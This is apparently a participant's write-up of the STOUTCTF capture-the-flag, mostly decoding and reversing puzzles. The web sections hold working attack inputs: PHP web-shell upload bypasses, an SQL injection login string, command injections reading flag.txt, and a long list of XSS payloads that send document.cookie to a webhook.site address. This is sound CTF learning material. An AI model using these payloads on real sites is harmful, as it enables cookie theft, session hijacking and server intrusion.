Lets deduce the hints and challenge description

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Thanks to the hints, there are four parts to find to get the flag. One in each, `HTTP`, `FTP`, `TCP`, `UDP`.\
It mentions about uppercase and lower case. It being the key to get flag. So, one ciphertext, three key. 3 keys? Which cipher use 3 keys? Welp just read.\
Lastly it mentions about teacher\
First, `CTRL+F` teacher

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

You see that? It’s a ciphertext bro. Now we are done in `http`.\
Second, `ftp`

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Just scroll and you see the one and only\
Third, `TCP`\
We want to prepare the colomn first. Right click the Data -> protocol reference -> Show data as text

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

Then right click apply as column

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Here you want to find all lowercase or all uppercase as the challenge description said about it. Then find the odd one. Looking at the scroll button theres and odd one tho

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

So now got Upper, so other one ofcourse lower\
Fourth, find Lower in `udp`

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Not we got all four parts. But what encryption? Now im making my deduction

<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

After 10 minutes staring at this note, and comparing YTERTCTQ to STOUTCTF, I got like this.

<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

Does it make sense to you? For me yes. For example, we take a look at letter Y. uppercase Y is in the same number position for S in alphabetical order. Same with other flag format. So now its confirm my deduction is correct.\
I manually map this and not using any script cause im a noob. Eventually, I got:\
`STOUTCTF{E8YrQNB6mWaI2PGncYjBKGkyz3yl8Iec}`\
Solved the hardest challenge at 4am and im still hoarding till now (im writing this writeup rn when Im doing malware challenge). Only Peyton know about this :P

<figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

All flag got except malware and the last web. This one is valuable. I cant let anyone know I got this flag

***

## Misc

***

### BINARY!

**Description:**\
Is this binary exploitation?

01010011 01010100 01001111 01010101 01010100 01000011 01010100 01000110 01111011 01000111 01011000 01000110 01010111 01000011 01011000 01010010 00110000 01100100 01000110 00110000 01110111 01001101 01001001 01111000 01011010 01101111 01110100 01110101 01011001 01110101 01100100 01110010 01001100 01010101 01010001 01100001 01001110 01001100 01010000 01011000 00110101 01111101

**Flag:** STOUTCTF{GXFWCXR0dF0wMIxZotuYudrLUQaNLPX5}

Use from binary in cyberchef

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

***

### Make Alan Proud

**Description:**\
xased xlzdn snwia wfgnn rekze lytqc pgujf sfcis fiwfn sqxln qoemb mvlkn

Settings as shown below:

3 Rotor Model Rotor 1: VI, Initial: A, Ring A Rotor 2: I, Initial: Q, Ring A Rotor 3: III, Initial L, Ring A Reflector: UKW B Plugboard: BQ CR DI EJ KW MT OS PX UZ GH

**Flag:** STOUTCTF{abcdefghijklmnopqrstuvwxyzaabbcc}

I used online enigma decoder

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

Change the output to flag format

***

### Dots and Dashes

**Description:**\
... - --- ..- - -.-. - ..-. ..... ----. .-- -.... - ..-. .- .. --... -.... ...- ...-- -... ... --. .- . ..- - ..-. - .-- .. --.. --. -..- --.- .-. --.. -.- --.- ..

**Flag:** STOUTCTF{59W6TFAI76V3BSGAEUTFTWIZGXQRZKQI}

<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

STOUTCTF59W6TFAI76V3BSGAEUTFTWIZGXQRZKQI\
Change to flag format

***

### Grass

**Description:**\
Two Words with a space in between such as "Basic Flag" NO STOUTCTF{}

**Flag:** Morse Stress

Another online tool

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

***

### BasedPorts

**Description:**\
Thats a lot of Based Ports!

**Flag:** STOUTCTF{2qGnJPa3ojIfLRuwmunigRho19v3jca9}

Research about what base is using unicode

<figure><img src="../.gitbook/assets/image (125).png" alt="" width="563"><figcaption></figcaption></figure>

Found base65536. Use online decoder

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Then we got a base64. Put it in cyberchef and use the magic wang and you should automatically get Gunzip and render image.

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Export the image. Now same method I use in SKRCTF. Decode hex color.\
i use imagecolorpicker.com

<figure><img src="../.gitbook/assets/image (128).png" alt="" width="563"><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (129).png" alt="" width="563"><figcaption></figcaption></figure>

***

### Polar Bear

**Description:**\
1319448579496083489\


I've been learning a lot about Node.js. I love Node.js! There are so many different projects that can be made with it. Check out the project I made!

> There is no file for this challenge.

**Flag:** STOUTCTF{lUP8cYQtG1I2oswnGsaUMgIE3UhEQESh}

Snowflake is unique identifier. It starts with X. but eventually other social starts using it. I tried X or twitter but cant get the flag. Then got it in discord.

<figure><img src="../.gitbook/assets/image (130).png" alt="" width="458"><figcaption></figcaption></figure>

{% embed url="https://discordlookup.com/application/1319448579496083489" %}

<figure><img src="../.gitbook/assets/image (131).png" alt="" width="563"><figcaption></figcaption></figure>

***

## PHP File Upload

***

### File Upload Level 1

**Description:**\
The website is coded in PHP, so I guess the real vulnerability here is trusting it to begin with. You might need Burp Suite to exploit it – or just sneeze near the login page and see if it breaks!

`https://upload1.oplabs.us/`

> You may need to use Burp Suite for these challenges. There will be one or some levels that you need to override the file (but I won't let you know ^^)

**Flag:** STOUTCTF{rxM14VXNjhH0L6KM9vHMzpIVAKzzxHOq}

Make the payload. I wrote it in shell.php

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Submit it to the web challenge then got RCE.

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

add ?cmd=cat /flag.txt at the url

<figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

***

### File Upload Level 2

**Description:**\
`https://upload2.oplabs.us/`

**Flag:** STOUTCTF{aXVwCHhPi1sCGBZmtbrcYsiIsq1fWbnD}

Change the extension to file.png.php. then upload. Add ?cmd=cat /flag.txt at the url similar in php upload 1

<figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

***

### File Upload Level 3

**Description:**\
`https://upload3.oplabs.us/`

**Flag:** STOUTCTF{HUgYrh4ZK7a1Ztk8PQRsE843mPv1GxPn}

Change to shell.png.phar then upload

<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

***

### File Upload Level 4

**Description:**\
`https://upload4.oplabs.us/`

**Flag:** STOUTCTF{ElEq5VtDJ4ANFkrUqkaUBQveLHai0ju0}

Send .htaccess with SetHandler payload

<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

Then send payload

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

***

### File Upload Level 5

**Description:**\
`https://upload5.oplabs.us/`

**Flag:** STOUTCTF{W2vlJvVzC8ecumPT1LJEn1SMxvPIN1Hi}

Change content-type to image/png

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

But at secret.txt not flag.txt

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

***

### File Upload Level 6

**Description:**\
`https://upload6.oplabs.us/`

**Flag:** STOUTCTF{wqVbael0XOLFkQT2lgLHAkPrnUFxtw1p}

Use polyglot. Bypass mime type.\
Put payload in comment using exiftool.

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

Rename php to jpg

<figure><img src="../.gitbook/assets/image (144).png" alt="" width="107"><figcaption></figcaption></figure>

Then intercept upload. Then we rename it back to php.

<figure><img src="../.gitbook/assets/image (145).png" alt="" width="536"><figcaption></figcaption></figure>

Then just forward all

<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

***

## Reversing

***

### Bossman

**Description:**\
Defeat Liam

> Revive the dead code

**Flag:** STOUTCTF{VGZSVDBsWW9nUjRWa3ZDa2AfGfTCJvHH}

I use Jetbrain dotpeek. Using Dnspy cannot see the source

<figure><img src="../.gitbook/assets/image (149).png" alt="" width="563"><figcaption></figcaption></figure>

First try to run the find the strings in dotpeek to locate the function

<figure><img src="../.gitbook/assets/image (150).png" alt="" width="484"><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

Looking into the code we can see that the function getTime() is the only that have some sort of encoding process.

<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

Create the script

```python
import base64

# Data from the decompiled getTime() function
chArray1 = ['U', '1', 'R', 'P']
chArray2 = ['V', 'V', 'R', 'D']
chArray3 = ['V', 'E', 'Z', '7']
charArray1 = "VGZSVDBsWW9nUjRWa3ZDaEdab2tS"
charArray2 = "MkFmR2ZUQ0p2SEh9"

result = []

result.extend(chArray1)
result.extend(chArray2)
result.extend(chArray3)

# Encode charArray1 to Base64 and slice it to its original length
base64_encoded_charArray1 = base64.b64encode(charArray1.encode('utf-8')).decode('utf-8')
result.append(base64_encoded_charArray1[:len(charArray1)])

# Append charArray2 (interpreted as a UTF-8 string)
result.append(charArray2)

final_string = ''.join(result)

print(final_string)
```

Just run it and got base64. Why don’t I decode base64 in the code? I did not think of it U1RPVVRDVEZ7VkdaU1ZEQnNXVzluVWpSV2EzWkRhMkFmR2ZUQ0p2SEh9

<figure><img src="../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

***

## Scripting

***

### This Blows

**Description:**\
Looks like my code has some bugs. I was able to get it encoded but now I can't get back to the flag.

> Look at the base of the problem and work out. You might not even need scripting to get the flag.

**Flag:** STOUTCTF{afamzcEX6vbHeQNpLYW5KfUBCQzrSB6f}

Decode all of it first

<figure><img src="../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

And use blowfish decrypt

<figure><img src="../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

***

### Who Said 30 Times?

**Description:**\
What strange encoding. Can you decipher it to get the flag?

**Flag:** STOUTCTF{djfRQP4yBWjbcnEEixBHvUvta8iZd5Fm}

Sanitise the file so that we get only the base64 text (between the |)

```bash
$ cut -d '|' -f 2 Whi_Said_30.dat | tr -d '\n' > Who_Said_30.txt
```

Then make script to loop base64 decrypt 30 times

```python
import base64

input_file = "Who_Said_30.txt"
output_file = "decoded_output.txt"

with open(input_file, "r") as file:
    base64_text = file.read().strip()

decoded_text = base64_text

# Decode the base64 content 30 times
for i in range(30):
    try:
        decoded_text = base64.b64decode(decoded_text).decode("utf-8", errors="ignore")
    except Exception as e:
        print(f"Decoding failed at iteration {i + 1}: {e}")
        break

with open(output_file, "w") as file:
    file.write(decoded_text)

print("Decoding complete. Output saved to:", output_file)

```

```bash
$ cat decoded_output.txt
STOUTCTF{djfRQP4yBWjbcnEEixBHvUvta8iZd5Fm}
```

***

### Cost of Gas

**Description:**\
The cost of gas is insane! Can you believe node traversal is so expensive? I wish I had some sort of map or matrix describing the cheapest cost to any node from any node...

NodeA -> NodeC 32324 NodeB -> NodeA 26786 NodeC -> NodeB 77458 NodeC -> NodeD 19905 NodeC -> NodeG 19455 NodeD -> NodeA 64678 NodeD -> NodeE 57878 NodeE -> NodeF 29999 NodeE -> NodeA 82356 NodeF -> NodeC 77777 NodeF -> NodeA 33333 NodeF -> NodeD 88888 NodeF -> NodeG 88888 NodeG -> NodeA 1

Example submission: A -> B 1 B -> A 1

Resulting matrix: A B A 0 1 B 1 0

THIS IS WHAT YOUR FLAG SHOULD LOOK LIKE: STOUTCTF{0110}

* No spaces
* One line
* No letters

**Flag:** STOUTCTF{0109782323245222911010714010651779267860591107901513689316689278565194567745801990577783107782194556467817446097002057878878771164576333217311495656115561029999115111333331431156565785562143440085112110978332325522301101081401070}

ChatGPT ftw

```python
import numpy as np

edges = [
    ("NodeA", "NodeC", 32324),
    ("NodeB", "NodeA", 26786),
    ("NodeC", "NodeB", 77458),
    ("NodeC", "NodeD", 19905),
    ("NodeC", "NodeG", 19455),
    ("NodeD", "NodeA", 64678),
    ("NodeD", "NodeE", 57878),
    ("NodeE", "NodeF", 29999),
    ("NodeE", "NodeA", 82356),
    ("NodeF", "NodeC", 77777),
    ("NodeF", "NodeA", 33333),
    ("NodeF", "NodeD", 88888),
    ("NodeF", "NodeG", 88888),
    ("NodeG", "NodeA", 1)
]

# Initialize the nodes and map them to indices
nodes = ["NodeA", "NodeB", "NodeC", "NodeD", "NodeE", "NodeF", "NodeG"]
num_nodes = len(nodes)
node_index = {node: i for i, node in enumerate(nodes)}

# Initialize the adjacency matrix with infinity (high cost)
inf = float('inf')
matrix = np.full((num_nodes, num_nodes), inf)
np.fill_diagonal(matrix, 0)  # Cost to self is 0

# Populate the adjacency matrix
for src, dest, cost in edges:
    matrix[node_index[src], node_index[dest]] = cost

# Floyd-Warshall algorithm to compute shortest paths
for k in range(num_nodes):
    for i in range(num_nodes):
        for j in range(num_nodes):
            matrix[i, j] = min(matrix[i, j], matrix[i, k] + matrix[k, j])

# Convert the matrix into the required flag format
result = []
for i in range(num_nodes):
    for j in range(num_nodes):
        result.append(str(int(matrix[i, j])))

flag = "STOUTCTF{" + "".join(result) + "}"

print(flag)
```

***

### Strawberry Perl Forever

**Description:**\
"When I'm in Windows, I use strawberry Perl" -- Larry Wall

\*\*Recomended to use Perl Strawberry 5.40.0.1 to prevent any version issues - You can check your version with command perl -v

> Look for potential vulnerabilities in flag generator. Brute forcing is not a viable option for this challenge.

**Flag:** STOUTCTF{aRWkZtmhfuFE0JlB}

ChatGPT ftw again

```python
#!/usr/bin/perl
use strict;
use warnings;
use Digest::SHA qw(sha256_hex);

# Target hash from hash.txt
my $target_hash = '00ac7414402727fdf04c16b5dd7eb54533f459ff1943905e3e3143388e9460da';

# Initial time range (UTC equivalent of CST)
my $start_time = 1734462000; # Approximate start (21:40 CST)
my $end_time = 1734463200;   # Approximate end (22:00 CST)
my $increment = 600;         # Increase time range by 5 minutes (300 seconds)

# Function to generate a random string
sub random_string {
    my ($length, $seed) = @_;
    srand($seed);
    my @chars = ('a'..'z', 'A'..'Z', '0'..'9');
    my $random_string = '';
    for (1..$length) {
        $random_string .= $chars[int(rand(@chars))];
    }
    return $random_string;
}

# Brute-force loop
while (1) {
    print "Trying time range: $start_time to $end_time...\n";
    for my $seed ($start_time .. $end_time) {
        # Generate the random string and flag
        my $random_part = random_string(16, $seed);
        my $flag = "STOUTCTF{" . $random_part . "}";

        # Compute the SHA-256 hash
        my $computed_hash = sha256_hex($flag);

        # Check if the hash matches the target hash
        if ($computed_hash eq $target_hash) {
            print "Found Flag: $flag\n";
        }
    }

    # Increment the time range for the next iteration
    $start_time -= $increment;  # Expand earlier
    $end_time += $increment;    # Expand later
```

***

### Hackers Keyboard

**Description:**\
My hacker friend gave me this file saying that he hacked my keyboard. I have no idea what he means. Can you make sense of this file?

**Flag:** STOUTCTF{BY3YFBITP3VS1ECX6ERY}

Extract all HID DATA then map to keycode.

```python
# USB HID Keycode to Character Mapping with Shift Handling
keycode_map = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e', 0x09: 'f', 0x0A: 'g', 0x0B: 'h', 0x0C: 'i', 0x0D: 'j',
    0x0E: 'k', 0x0F: 'l', 0x10: 'm', 0x11: 'n', 0x12: 'o', 0x13: 'p', 0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
    0x18: 'u', 0x19: 'v', 0x1A: 'w', 0x1B: 'x', 0x1C: 'y', 0x1D: 'z', 0x1E: '1', 0x1F: '2', 0x20: '3', 0x21: '4',
    0x22: '5', 0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9', 0x27: '0', 0x28: 'Enter', 0x2C: ' ', 0x2D: '-', 0x2E: '=',
    0x2F: '[', 0x30: ']', 0x31: '\\', 0x33: ';', 0x34: "'", 0x35: '`', 0x36: ',', 0x37: '.', 0x38: '/'
}

# Shifted Characters Mapping
shifted_keycode_map = {
    0x04: 'A', 0x05: 'B', 0x06: 'C', 0x07: 'D', 0x08: 'E', 0x09: 'F', 0x0A: 'G', 0x0B: 'H', 0x0C: 'I', 0x0D: 'J',
    0x0E: 'K', 0x0F: 'L', 0x10: 'M', 0x11: 'N', 0x12: 'O', 0x13: 'P', 0x14: 'Q', 0x15: 'R', 0x16: 'S', 0x17: 'T',
    0x18: 'U', 0x19: 'V', 0x1A: 'W', 0x1B: 'X', 0x1C: 'Y', 0x1D: 'Z', 0x1E: '!', 0x1F: '@', 0x20: '#', 0x21: '$',
    0x22: '%', 0x23: '^', 0x24: '&', 0x25: '*', 0x26: '(', 0x27: ')', 0x2D: '_', 0x2E: '+', 0x2F: '{', 0x30: '}',
    0x31: '|', 0x33: ':', 0x34: '"', 0x35: '~', 0x36: '<', 0x37: '>', 0x38: '?'
}

# Input HID data
hid_data = """
00000b0000000000
0000000000000000
0000080000000000
0000000000000000
00000f0000000000
0000000000000000
00000f0000000000
0000000000000000
0000120000000000
0000000000000000
00002c0000000000
0000000000000000
00000b0000000000
0000000000000000
0000120000000000
0000000000000000
...
"""

# Decode the HID data
decoded_output = []
for line in hid_data.splitlines():
    line = line.strip()  # Remove extra whitespace
    if len(line) == 16:  # Ensure the line has exactly 16 hex characters
        try:
            bytes_data = bytes.fromhex(line)
            modifier = bytes_data[0]  # Modifier byte (Shift, Ctrl, etc.)
            keycode = bytes_data[2]  # Keycode byte
            if keycode != 0:
                if modifier & 0x02:  # Check if Shift is pressed
                    char = shifted_keycode_map.get(keycode, '')
                else:
                    char = keycode_map.get(keycode, '')
                decoded_output.append(char)
        except ValueError:
            continue

# Join the decoded characters into a string
decoded_text = ''.join(decoded_output)
print("Decoded Text:")
print(decoded_text)
```

The code failed. So I just manually do it. Refer to this [pdf](https://usb.org/sites/default/files/hut1_5.pdf)

***

## Web

***

### Nuclear Codes

**Description:**\
Have fun!\
`https://ctf.oplabs.us/web/NuclearCodes`

**Flag:** STOUTCTF{vkU8yXCSxZtY9YrhMzyaUSoWVHapVF84}

In page source there’s code.php

```html
<form action="codes.php" method="POST">
    <div class="input-group">
        <label for "username">Username</label>
        <input
            type="text"
            id="username"
            name="username"
            placeholder="Enter your username"
            required
        />
```

go to `https://ctf.oplabs.us/web/NuclearCodes/codes.php`

<figure><img src="../.gitbook/assets/image (158).png" alt="" width="563"><figcaption></figcaption></figure>

***

### PharmaNet

**Description:**\
`https://ctf.oplabs.us/web/PharmaNet/`

**Flag:** STOUTCTF{znjxwDeeXo1jNlz6JLyK77qOTyD2OVOh}

Basic sql injection

i used `admin' -- -`

<figure><img src="../.gitbook/assets/image (159).png" alt="" width="335"><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (160).png" alt="" width="391"><figcaption></figcaption></figure>

***

### whois lvl1

**Description:**\
`https://ci.oplabs.us`

**Flag:** STOUTCTF{6GmWewZFLZqlsEmSxeHehXCMajEEI9IX}

reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

Use `127.0.0.1; cat flag.txt`

<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

***

### whois lvl2

**Description:**\
`https://ci2.oplabs.us`

**Flag:** STOUTCTF{tCoW5voLpV44AsdzOigETrE3IZMHVBV6}

Use `127.0.0.1|cat flag.txt`

***

### whois lvl3

**Description:**\
`https://ci3.oplabs.us`

**Flag:** STOUTCTF{18kUctpnd5aze563mm2uMBbWL7CT1A2e}

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

***

### whois lvl4

**Description:**\
`https://ci4.oplabs.us`

**Flag:** STOUTCTF{aivDe09dO5vVX40AHSKaKi7kXC5YfXoT}

I stuck here but theres /flag.txt. donno why. Free points

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

***

### Mr Bean's Little Beans

**Description:**\
`https://ctf.oplabs.us/web/MrBean/`

**Flag:** CURTIN\_CTF{t3mpl4t3s\_ar3\_e4sy\_t0\_cr4ck}

just go to /admin

<figure><img src="../.gitbook/assets/image (164).png" alt="" width="559"><figcaption></figcaption></figure>

***

## Malware - Blue

**Description:**\
WARNING: THIS IS A DESTRUCTIVE EXECUTABLE.

This file is ONLY to be run in a Virtual Machine (VM) or isloated, disposable environment.

DO NOT execute this on your primary system.

ONLY execute this challenge if you understand the risks involved and have taken appropriate precautions.

Archive password is 'infected'

**Flag:** CURTIN\_CTF{NO\_P@TH}

First of all, Im not good at malware analysis. So when there are malware challenge, I can only hope to decrypt whatever I saw in bunch of tools. Some of the tools im using is IDAPRO, any.run and Virus Total. This takes A LOT of my time as Im not good at web so im more focusing on other things.\
You see how many task I’ve run? Then I saw that it have a restart button. So there should be more than this. Like tripled.

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

All of the file that I can extract I gave to ChatGPT hoping there is flag plaintext. But nope

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

AI summary also doesn’t yield anything useful.

So for like 1 day and half, I cant get anything in any.run. or im too noob. Pls give me tips @John

I did use IDAPro. But the thing is, the malware is obfuscated. The only thing I know that unobfuscate is just UPX. So, I tried UPX -d and go to IDApro again. But it still says its obfuscated. I don’t remember where it said that maybe chatgpt because in Chatgpt there is Malware Analysis malware, but I use it for one hour only and its useless. So, the string in IDApro is too many and I’m too noob at searching from thousands of no name functions.

Then after I got substitute teacher’s flag, and flag hoarding it (sorry h4rmony) I focused on malware again. I installed new VM and tried to run in it, but it kept crashing. You know how long I tried? Freaking 10 hours. But its okay, in the meantime, I do my writeup while installing and uninstalling the VM and submitting flags that Im hoarding. Then after finished doing my writeup and submitting flags (except the last web chall I cant get it).

Same timestamp as submitting flag and doing writeup, and while trying to “failed dynamic” analysis of the malware, I export virustotal analysis and feed to chatgpt (expand all the report and screenshotting) multiple times I got something. When screenshotting behaviour tab, under Registry keys set there are base64 encoding that give flag OMG

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

ChatGPT decoded it but its gone. So here is the cyberchef screenshot

<figure><img src="../.gitbook/assets/image (168).png" alt="" width="563"><figcaption></figcaption></figure>

That’s all from me, just a noob guy using chatgpt if I don’t know anything about it. Imma do the last web challenge now and I’ll update if I get it. Don’t know if I can cause the whole day im looking at the screen.

***

## Web - Crossing The Seven Seas

**Description:**\
`https://museum.oplabs.us/`

**Flag:** STOUTCTF{aCnxNhCcP5P7sXPjEIfxFgnrHnn4V57t}

At the same time when doing this CTf, I am doing my exam for Web Penetration certificate. To pass the exam I need to get two flag in their CTF. So all the challenge is Web.

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

The last web challenge is XSS. So after Im done with malware, I visit this CTF. But I specifically do only the XSS challenges to enhance my understanding in XSS. So its more like Im doing warmup before visiting Crossing the Seven Seas. Thanks for this CTF and video recording of the classes, I managed to get it

<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Now I just need to apply the same mindset in solving Crossing the Seven Seas. Don’t worry by the time im writing this I already got the flag. So here is how I’m tackling my nightmare

Now I know how to use webhook. (by using chatgpt). I just tell it to make payload for blind XSS using my webhook link.

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

```markdown
"><img src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><svg onload=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><iframe src="javascript:fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)">
"><video src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><audio src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><embed src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><details open ontoggle=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><marquee loop=1 onfinish=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><img src=x onerror="this.src='https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie">
"><script src='https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/xss.js'></script>
"><svg onload=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+btoa(document.cookie))>
"><img src=x onerror="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/?c='+document.cookie)">
"><iframe src="javascript:fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)">
"><img src=x onerror="this.src='https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/?cookie='+document.cookie">
"><object data=x onerror="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/?dom='+document.domain)">
"><script>new Image().src='https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/?cookie='+document.cookie;</script>
"><img src=x onerror=eval(atob('bmV3IEltYWdlKCkuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2EwMjI2
%3Cimg%20src%3Dx%20onerror%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2Fa0226701-472d-4695-b14b-e3187381c9fa%2F%27%2Bdocument.cookie%29%3E
%3Csvg%20onload%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2Fa0226701-472d-4695-b14b-e3187381c9fa%2F%27%2Bdocument.cookie%29%3E
%3Ciframe%20src%3D%22javascript%3Afetch%28%27https%3A%2F%2Fwebhook.site%2Fa0226701-472d-4695-b14b-e3187381c9fa%2F%27%2Bdocument.cookie%29%22%3E
%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2Fa0226701-472d-4695-b14b-e3187381c9fa%2F%3Fcookie%3D%27%2Bdocument.cookie%29%22%3E
"><img src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><div onmouseover=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>Hover me</div>
"><a href="#" onclick=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>Click me</a>
"><body onload=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><iframe srcdoc="<svg onload=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>"></iframe>
"><object data=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)>
"><img/src=x onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)//>
"><svg onload=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)//>
"><iframe src=javascript:fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)//>
"><video><source onerror=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)></video>
"><details ontoggle=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)//>
"><marquee loop=1 onfinish=fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)//>
<img src="x" onerror="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)">
<input type="text" autofocus onfocus="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)">
<textarea autofocus onfocus="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)"></textarea>
<button onclick="fetch('https://webhook.site/a0226701-472d-4695-b14b-e3187381c9fa/'+document.cookie)">Click</button>
```

Use intruder to attack

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

Check webhook and got request

<figure><img src="../.gitbook/assets/image (173).png" alt="" width="349"><figcaption></figcaption></figure>

All request got this web encoded url

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Then decode url

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

\--The End-- {: style="text-align: center;"}
